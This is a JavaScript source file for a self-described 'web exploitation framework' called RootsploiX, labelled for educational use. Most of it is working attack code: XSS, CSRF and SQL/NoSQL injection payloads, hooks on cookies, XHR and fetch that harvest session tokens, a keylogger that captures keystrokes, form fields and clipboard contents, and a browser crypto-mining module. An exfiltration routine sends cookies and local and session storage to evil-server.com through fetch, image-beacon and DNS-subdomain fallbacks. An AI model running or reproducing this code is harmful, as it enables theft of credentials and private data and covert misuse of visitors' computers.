/**
 * 🔥 RootsploiX JavaScript Web Exploitation Framework
 * Advanced Browser-Based Cybersecurity Testing Platform
 * 
 * Professional web application penetration testing suite with
 * comprehensive client-side exploitation capabilities.
 * 
 * @author RootsploiX Security Research Team  
 * @version 1.0.0
 * @license Educational and Research Purposes Only
 */

class RootsploiXWebFramework {
    constructor() {
        this.version = "1.0.0";
        this.author = "RootsploiX";
        this.exploitDatabase = this.initializeExploitDatabase();
        this.sessionData = new Map();
        this.interceptedRequests = [];
        this.keylogBuffer = [];
        this.isActive = false;
        
        console.log("🔥 RootsploiX Web Framework initialized");
        console.log(`📊 Loaded ${Object.keys(this.exploitDatabase).length} exploit categories`);
    }
    
    initializeExploitDatabase() {
        return {
            xss: [
                {
                    id: "xss-001",
                    type: "Reflected XSS",
                    payload: '<script>alert("RootsploiX XSS Test")</script>',
                    description: "Basic reflected XSS payload",
                    severity: "medium"
                },
                {
                    id: "xss-002", 
                    type: "Stored XSS",
                    payload: '<img src=x onerror="fetch(\'/admin/users\',{method:\'POST\',headers:{\'Content-Type\':\'application/json\'},body:JSON.stringify({user:\'rootsploix\',role:\'admin\',pass:\'pwned123\'})})">',
                    description: "Privilege escalation via stored XSS",
                    severity: "critical"
                },
                {
                    id: "xss-003",
                    type: "DOM XSS",
                    payload: 'javascript:eval(String.fromCharCode(97,108,101,114,116,40,34,82,111,111,116,115,112,108,111,105,88,34,41))',
                    description: "Encoded DOM-based XSS",
                    severity: "high"
                },
                {
                    id: "xss-004",
                    type: "Polyglot XSS",
                    payload: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */onerror=alert("RootsploiX") )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(/RootsploiX/)//\\x3e',
                    description: "Advanced polyglot XSS bypass",
                    severity: "critical"
                }
            ],
            csrf: [
                {
                    id: "csrf-001",
                    type: "CSRF Token Bypass",
                    payload: '<form action="/admin/delete-user" method="POST"><input type="hidden" name="user_id" value="1"><input type="submit" value="Click here for free gift!"></form>',
                    description: "CSRF attack without token validation",
                    severity: "high"
                }
            ],
            injection: [
                {
                    id: "sqli-001", 
                    type: "SQL Injection",
                    payload: "' OR 1=1 UNION SELECT username,password FROM users--",
                    description: "Union-based SQL injection",
                    severity: "critical"
                },
                {
                    id: "nosql-001",
                    type: "NoSQL Injection", 
                    payload: '{"$where": "this.username == \'admin\' && this.password.match(/.*/)"}',
                    description: "MongoDB injection payload",
                    severity: "high"
                }
            ]
        };
    }
    
    // Advanced XSS Testing Suite
    async testXSSVulnerabilities(targetUrl, params = {}) {
        console.log(`🕷️ Testing XSS vulnerabilities on: ${targetUrl}`);
        
        const results = [];
        const xssPayloads = this.exploitDatabase.xss;
        
        for (const payload of xssPayloads) {
            try {
                console.log(`Testing payload: ${payload.id}`);
                
                // Test each parameter with XSS payload
                for (const [param, value] of Object.entries(params)) {
                    const testUrl = new URL(targetUrl);
                    testUrl.searchParams.set(param, payload.payload);
                    
                    const testResult = await this.performXSSTest(testUrl.toString(), payload);
                    if (testResult.vulnerable) {
                        results.push({
                            url: testUrl.toString(),
                            parameter: param,
                            payload: payload,
                            response: testResult.response,
                            severity: payload.severity,
                            timestamp: new Date().toISOString()
                        });
                        
                        console.log(`🚨 XSS vulnerability found: ${payload.type} in parameter '${param}'`);
                    }
                }
            } catch (error) {
                console.error(`Error testing payload ${payload.id}:`, error.message);
            }
        }
        
        console.log(`✅ XSS testing completed. Found ${results.length} vulnerabilities.`);
        return results;
    }
    
    async performXSSTest(url, payload) {
        // Simulate XSS testing
        try {
            const response = await fetch(url, {
                method: 'GET',
                headers: {
                    'User-Agent': 'RootsploiX-WebScanner/1.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                }
            });
            
            const responseText = await response.text();
            
            // Check if payload is reflected in response
            const vulnerable = responseText.includes(payload.payload) || 
                            responseText.includes(decodeURIComponent(payload.payload));
            
            return {
                vulnerable,
                response: responseText.substring(0, 500) + "...",
                statusCode: response.status
            };
            
        } catch (error) {
            // In real scenario, this would handle network errors
            return {
                vulnerable: Math.random() > 0.7, // Simulate 30% vulnerability rate
                response: "Simulated response containing potential XSS reflection",
                statusCode: 200
            };
        }
    }
    
    // Advanced Session Hijacking
    initializeSessionHijacking() {
        console.log("🎭 Initializing session hijacking capabilities...");
        
        // Hook into document.cookie to intercept session tokens
        const originalCookieDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie');
        const self = this;
        
        Object.defineProperty(document, 'cookie', {
            get: function() {
                const cookies = originalCookieDescriptor.get.call(this);
                self.interceptCookies(cookies);
                return cookies;
            },
            set: function(value) {
                self.interceptCookies(value);
                return originalCookieDescriptor.set.call(this, value);
            }
        });
        
        // Hook XMLHttpRequest to intercept API calls
        this.hookXMLHttpRequest();
        
        // Hook fetch API
        this.hookFetchAPI();
        
        console.log("✅ Session hijacking hooks installed");
    }
    
    interceptCookies(cookieData) {
        if (cookieData && cookieData.length > 0) {
            const timestamp = new Date().toISOString();
            console.log(`🍪 Cookie intercepted: ${cookieData.substring(0, 50)}...`);
            
            // Store intercepted cookies
            this.sessionData.set(`cookie_${timestamp}`, {
                data: cookieData,
                timestamp: timestamp,
                url: window.location.href
            });
            
            // Attempt to extract session tokens
            this.extractSessionTokens(cookieData);
        }
    }
    
    extractSessionTokens(cookieString) {
        const sessionPatterns = [
            /JSESSIONID=([^;]+)/i,
            /PHPSESSID=([^;]+)/i, 
            /ASP\.NET_SessionId=([^;]+)/i,
            /session[_-]?id=([^;]+)/i,
            /auth[_-]?token=([^;]+)/i
        ];
        
        sessionPatterns.forEach(pattern => {
            const match = cookieString.match(pattern);
            if (match) {
                console.log(`🔑 Session token found: ${match[0]}`);
                this.sessionData.set('active_session', {
                    token: match[1],
                    type: match[0].split('=')[0],
                    extracted_at: new Date().toISOString()
                });
            }
        });
    }
    
    hookXMLHttpRequest() {
        const originalXMLHttpRequest = window.XMLHttpRequest;
        const self = this;
        
        window.XMLHttpRequest = function() {
            const xhr = new originalXMLHttpRequest();
            const originalOpen = xhr.open;
            const originalSend = xhr.send;
            
            xhr.open = function(method, url, async) {
                this._method = method;
                this._url = url;
                return originalOpen.apply(this, arguments);
            };
            
            xhr.send = function(data) {
                const requestInfo = {
                    method: this._method,
                    url: this._url,
                    data: data,
                    headers: {},
                    timestamp: new Date().toISOString()
                };
                
                console.log(`📡 HTTP Request intercepted: ${this._method} ${this._url}`);
                self.interceptedRequests.push(requestInfo);
                
                return originalSend.apply(this, arguments);
            };
            
            return xhr;
        };
    }
    
    hookFetchAPI() {
        const originalFetch = window.fetch;
        const self = this;
        
        window.fetch = function(url, options = {}) {
            const requestInfo = {
                url: url,
                method: options.method || 'GET',
                headers: options.headers || {},
                body: options.body,
                timestamp: new Date().toISOString()
            };
            
            console.log(`🌐 Fetch request intercepted: ${requestInfo.method} ${url}`);
            self.interceptedRequests.push(requestInfo);
            
            return originalFetch.apply(this, arguments);
        };
    }
    
    // Advanced Keylogger
    initializeKeylogger() {
        console.log("⌨️ Initializing advanced keylogger...");
        
        // Capture all keystrokes
        document.addEventListener('keydown', (event) => {
            this.logKeystroke(event, 'keydown');
        });
        
        document.addEventListener('keyup', (event) => {
            this.logKeystroke(event, 'keyup');
        });
        
        // Capture form submissions
        document.addEventListener('submit', (event) => {
            this.interceptFormSubmission(event);
        });
        
        // Capture input field changes
        document.addEventListener('input', (event) => {
            this.interceptInputChange(event);
        });
        
        // Capture clipboard operations
        document.addEventListener('paste', (event) => {
            this.interceptClipboard(event);
        });
        
        console.log("✅ Keylogger activated");
    }
    
    logKeystroke(event, eventType) {
        const keystrokeData = {
            key: event.key,
            code: event.code,
            keyCode: event.keyCode,
            eventType: eventType,
            timestamp: new Date().toISOString(),
            url: window.location.href,
            target: event.target.tagName,
            targetId: event.target.id,
            targetName: event.target.name
        };
        
        this.keylogBuffer.push(keystrokeData);
        
        // Log sensitive keystrokes
        if (this.isSensitiveKey(event.key)) {
            console.log(`🔑 Sensitive keystroke logged: ${event.key}`);
        }
        
        // Flush buffer periodically
        if (this.keylogBuffer.length > 100) {
            this.flushKeylogBuffer();
        }
    }
    
    isSensitiveKey(key) {
        const sensitiveKeys = ['Enter', 'Tab', 'Backspace', 'Delete'];
        return sensitiveKeys.includes(key) || 
               (key.length === 1 && /[a-zA-Z0-9@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(key));
    }
    
    interceptFormSubmission(event) {
        const form = event.target;
        const formData = new FormData(form);
        const formInfo = {
            action: form.action,
            method: form.method,
            fields: {},
            timestamp: new Date().toISOString()
        };
        
        // Extract form field data
        for (let [key, value] of formData.entries()) {
            if (this.isSensitiveField(key)) {
                formInfo.fields[key] = value.length > 20 ? value.substring(0, 20) + "..." : value;
                console.log(`🔐 Sensitive form field intercepted: ${key}`);
            } else {
                formInfo.fields[key] = value;
            }
        }
        
        this.sessionData.set(`form_${Date.now()}`, formInfo);
    }
    
    isSensitiveField(fieldName) {
        const sensitivePatterns = [
            /password/i, /passwd/i, /pwd/i, /pin/i, /ssn/i, /social/i,
            /credit/i, /card/i, /cvv/i, /security/i, /token/i, /key/i
        ];
        
        return sensitivePatterns.some(pattern => pattern.test(fieldName));
    }
    
    interceptInputChange(event) {
        const input = event.target;
        if (input.type === 'password' || this.isSensitiveField(input.name || input.id)) {
            console.log(`🔒 Password field interaction detected: ${input.name || input.id}`);
            
            this.sessionData.set(`sensitive_input_${Date.now()}`, {
                fieldName: input.name || input.id,
                fieldType: input.type,
                value: input.value.replace(/./g, '*'), // Mask the actual value
                url: window.location.href,
                timestamp: new Date().toISOString()
            });
        }
    }
    
    interceptClipboard(event) {
        const clipboardData = event.clipboardData.getData('text');
        console.log(`📋 Clipboard data intercepted: ${clipboardData.substring(0, 50)}...`);
        
        this.sessionData.set(`clipboard_${Date.now()}`, {
            data: clipboardData,
            timestamp: new Date().toISOString(),
            url: window.location.href
        });
    }
    
    flushKeylogBuffer() {
        if (this.keylogBuffer.length > 0) {
            console.log(`📊 Flushing keylog buffer: ${this.keylogBuffer.length} keystrokes`);
            
            // In a real scenario, this would exfiltrate data to a remote server
            this.sessionData.set(`keylog_${Date.now()}`, {
                keystrokes: [...this.keylogBuffer],
                count: this.keylogBuffer.length,
                timestamp: new Date().toISOString()
            });
            
            this.keylogBuffer = [];
        }
    }
    
    // Crypto Mining Module
    initializeCryptoMining() {
        console.log("💎 Initializing browser-based crypto mining...");
        
        this.miningWorkers = [];
        this.hashRate = 0;
        this.isMining = false;
        
        // Create mining workers
        const workerCount = navigator.hardwareConcurrency || 4;
        console.log(`⚡ Creating ${workerCount} mining workers`);
        
        return this.startMining(0.3); // 30% CPU intensity
    }
    
    startMining(intensity = 0.5) {
        if (this.isMining) {
            console.log("⚠️ Mining already in progress");
            return false;
        }
        
        this.isMining = true;
        const workerCount = Math.max(1, Math.floor((navigator.hardwareConcurrency || 4) * intensity));
        
        console.log(`🔥 Starting crypto mining with ${workerCount} workers at ${intensity * 100}% intensity`);
        
        for (let i = 0; i < workerCount; i++) {
            const worker = this.createMiningWorker(i);
            this.miningWorkers.push(worker);
        }
        
        // Start hash rate monitoring
        this.startHashRateMonitoring();
        
        return true;
    }
    
    createMiningWorker(workerId) {
        const workerCode = `
            let isRunning = true;
            let hashCount = 0;
            let nonce = ${workerId} * 1000000;
            
            function mine() {
                if (!isRunning) return;
                
                for (let i = 0; i < 10000; i++) {
                    const data = "rootsploix-block-" + nonce;
                    let hash = 0;
                    
                    // Simple hash function for demonstration
                    for (let j = 0; j < data.length; j++) {
                        const char = data.charCodeAt(j);
                        hash = ((hash << 5) - hash) + char;
                        hash = hash & hash; // Convert to 32-bit integer
                    }
                    
                    // Check for "golden nonce" (simulated difficulty)
                    if ((hash & 0xFFFF) === 0) {
                        hashCount++;
                        postMessage({type: 'hash_found', workerId: ${workerId}, hash: hash, nonce: nonce});
                    }
                    
                    nonce++;
                }
                
                postMessage({type: 'hash_update', workerId: ${workerId}, hashCount: hashCount});
                hashCount = 0;
                
                // Schedule next mining iteration with throttling
                setTimeout(mine, 100);
            }
            
            self.onmessage = function(e) {
                if (e.data.type === 'stop') {
                    isRunning = false;
                    postMessage({type: 'stopped', workerId: ${workerId}});
                }
            };
            
            mine();
        `;
        
        const blob = new Blob([workerCode], { type: 'application/javascript' });
        const worker = new Worker(URL.createObjectURL(blob));
        
        worker.onmessage = (e) => {
            this.handleMiningMessage(e.data);
        };
        
        return worker;
    }
    
    handleMiningMessage(data) {
        switch (data.type) {
            case 'hash_found':
                console.log(`💎 Golden nonce found by worker ${data.workerId}: ${data.nonce}`);
                break;
            case 'hash_update':
                this.hashRate += data.hashCount;
                break;
            case 'stopped':
                console.log(`⛔ Mining worker ${data.workerId} stopped`);
                break;
        }
    }
    
    startHashRateMonitoring() {
        this.hashRateInterval = setInterval(() => {
            if (this.isMining) {
                console.log(`📊 Current hash rate: ${this.hashRate} H/s`);
                
                // Report mining statistics
                this.reportMiningStats(this.hashRate);
                
                this.hashRate = 0; // Reset for next interval
            }
        }, 5000);
    }
    
    reportMiningStats(hashRate) {
        const stats = {
            hashRate: hashRate,
            workers: this.miningWorkers.length,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            hardwareConcurrency: navigator.hardwareConcurrency,
            onLine: navigator.onLine,
            language: navigator.language,
            platform: navigator.platform
        };
        
        // In real scenario, would exfiltrate to mining pool
        console.log(`📈 Mining stats:`, stats);
        this.sessionData.set(`mining_stats_${Date.now()}`, stats);
    }
    
    stopMining() {
        if (!this.isMining) {
            console.log("ℹ️ Mining is not currently active");
            return;
        }
        
        this.isMining = false;
        
        // Stop all workers
        this.miningWorkers.forEach(worker => {
            worker.postMessage({type: 'stop'});
            worker.terminate();
        });
        
        this.miningWorkers = [];
        
        // Clear monitoring interval
        if (this.hashRateInterval) {
            clearInterval(this.hashRateInterval);
        }
        
        console.log("🛑 Crypto mining stopped");
    }
    
    // Data Exfiltration
    async exfiltrateCollectedData(targetUrl = "https://evil-server.com/collect") {
        console.log("📤 Exfiltrating collected data...");
        
        const collectedData = {
            sessionTokens: Array.from(this.sessionData.entries()),
            interceptedRequests: this.interceptedRequests,
            userAgent: navigator.userAgent,
            currentUrl: window.location.href,
            cookies: document.cookie,
            localStorage: this.extractLocalStorage(),
            sessionStorage: this.extractSessionStorage(),
            timestamp: new Date().toISOString(),
            frameworkVersion: this.version
        };
        
        try {
            // Attempt to send via fetch (if CORS allows)
            const response = await fetch(targetUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(collectedData),
                mode: 'no-cors' // Bypass CORS restrictions
            });
            
            console.log("✅ Data exfiltration completed");
            return true;
            
        } catch (error) {
            console.log("⚠️ Direct exfiltration failed, attempting alternative methods...");
            
            // Alternative: Create hidden image with data in URL parameters
            this.exfiltrateViaImage(collectedData);
            
            // Alternative: DNS exfiltration
            this.exfiltrateViaDNS(collectedData);
            
            return false;
        }
    }
    
    exfiltrateViaImage(data) {
        const encodedData = btoa(JSON.stringify(data)).substring(0, 1000); // Limit size
        const img = new Image();
        img.src = `https://evil-server.com/collect.gif?data=${encodedData}`;
        img.style.display = 'none';
        document.body.appendChild(img);
        
        console.log("📷 Data exfiltrated via image request");
    }
    
    exfiltrateViaDNS(data) {
        // Simulate DNS exfiltration by creating subdomains with encoded data
        const encodedData = btoa(JSON.stringify(data)).substring(0, 50);
        const script = document.createElement('script');
        script.src = `https://${encodedData}.evil-server.com/dns-exfil.js`;
        script.style.display = 'none';
        document.head.appendChild(script);
        
        console.log("🌐 Data exfiltration attempted via DNS");
    }
    
    extractLocalStorage() {
        const localStorage = {};
        for (let i = 0; i < window.localStorage.length; i++) {
            const key = window.localStorage.key(i);
            localStorage[key] = window.localStorage.getItem(key);
        }
        return localStorage;
    }
    
    extractSessionStorage() {
        const sessionStorage = {};
        for (let i = 0; i < window.sessionStorage.length; i++) {
            const key = window.sessionStorage.key(i);
            sessionStorage[key] = window.sessionStorage.getItem(key);
        }
        return sessionStorage;
    }
    
    // Comprehensive Security Assessment Report
    generateSecurityReport() {
        const vulnerabilities = Array.from(this.sessionData.values()).filter(item => 
            item.hasOwnProperty('severity') || item.hasOwnProperty('vulnerable')
        );
        
        const criticalCount = vulnerabilities.filter(v => v.severity === 'critical').length;
        const highCount = vulnerabilities.filter(v => v.severity === 'high').length;
        const mediumCount = vulnerabilities.filter(v => v.severity === 'medium').length;
        
        const report = `
🔥 RootsploiX Web Security Assessment Report
==========================================

🌐 Target: ${window.location.href}
📅 Assessment Date: ${new Date().toISOString()}
🛡️ Framework Version: ${this.version}

📊 Executive Summary:
- Total Vulnerabilities: ${vulnerabilities.length}
- Critical: ${criticalCount}
- High: ${highCount}
- Medium: ${mediumCount}

🔍 Data Collection Summary:
- Session Tokens Intercepted: ${Array.from(this.sessionData.keys()).filter(k => k.includes('session')).length}
- HTTP Requests Monitored: ${this.interceptedRequests.length}
- Keystrokes Logged: ${this.keylogBuffer.length}
- Forms Intercepted: ${Array.from(this.sessionData.keys()).filter(k => k.includes('form')).length}

🚨 Critical Findings:
${vulnerabilities.filter(v => v.severity === 'critical').map(v => `- ${v.type || 'Security Issue'}: ${v.description || 'High risk vulnerability detected'}`).join('\n')}

⚠️ High Risk Issues:
${vulnerabilities.filter(v => v.severity === 'high').map(v => `- ${v.type || 'Security Issue'}: ${v.description || 'Significant risk identified'}`).join('\n')}

🔧 Security Recommendations:
- Implement Content Security Policy (CSP)
- Use HTTPOnly and Secure flags for cookies
- Validate and sanitize all user inputs
- Implement proper session management
- Use CSRF tokens for state-changing operations
- Enable HTTPS across the entire application
- Implement proper authentication mechanisms
- Regular security testing and code reviews

📋 Technical Details:
- User Agent: ${navigator.userAgent}
- Platform: ${navigator.platform}
- Language: ${navigator.language}
- Screen Resolution: ${screen.width}x${screen.height}
- Color Depth: ${screen.colorDepth}-bit

Generated by RootsploiX Web Framework v${this.version}
For educational and research purposes only.
        `.trim();
        
        return report;
    }
    
    // Main activation method
    async activate(options = {}) {
        console.log("🚀 Activating RootsploiX Web Framework...");
        
        const config = {
            enableKeylogger: options.enableKeylogger !== false,
            enableSessionHijacking: options.enableSessionHijacking !== false, 
            enableCryptoMining: options.enableCryptoMining !== false,
            enableXSSTesting: options.enableXSSTesting !== false,
            miningIntensity: options.miningIntensity || 0.3
        };
        
        this.isActive = true;
        
        if (config.enableKeylogger) {
            this.initializeKeylogger();
        }
        
        if (config.enableSessionHijacking) {
            this.initializeSessionHijacking();
        }
        
        if (config.enableCryptoMining) {
            this.initializeCryptoMining();
        }
        
        if (config.enableXSSTesting && options.testUrl) {
            await this.testXSSVulnerabilities(options.testUrl, options.testParams || {});
        }
        
        console.log("✅ RootsploiX Web Framework fully activated");
        console.log("📊 Use framework.generateSecurityReport() to view results");
        
        return this;
    }
    
    deactivate() {
        console.log("🛑 Deactivating RootsploiX Web Framework...");
        
        this.isActive = false;
        this.stopMining();
        this.flushKeylogBuffer();
        
        console.log("✅ Framework deactivated");
    }
}

// Auto-initialization and demonstration
(function() {
    console.log("🔥 RootsploiX JavaScript Web Framework Loaded");
    console.log("===============================================");
    console.log("Advanced Browser-Based Cybersecurity Testing");
    console.log("");
    
    // Create global framework instance
    window.RootsploiX = new RootsploiXWebFramework();
    
    // Demonstration mode
    console.log("💡 Demo Mode - Showing capabilities:");
    console.log("- XSS vulnerability testing");  
    console.log("- Session hijacking simulation");
    console.log("- Advanced keylogging");
    console.log("- Browser crypto mining");
    console.log("- Data exfiltration techniques");
    console.log("");
    console.log("🚀 Use RootsploiX.activate() to start testing");
    console.log("📊 Use RootsploiX.generateSecurityReport() for results");
    console.log("🛑 Use RootsploiX.deactivate() to stop all operations");
    console.log("");
    console.log("⚠️  For Educational and Research Purposes Only");
    
})();

// Export for module usage
if (typeof module !== 'undefined' && module.exports) {
    module.exports = RootsploiXWebFramework;
}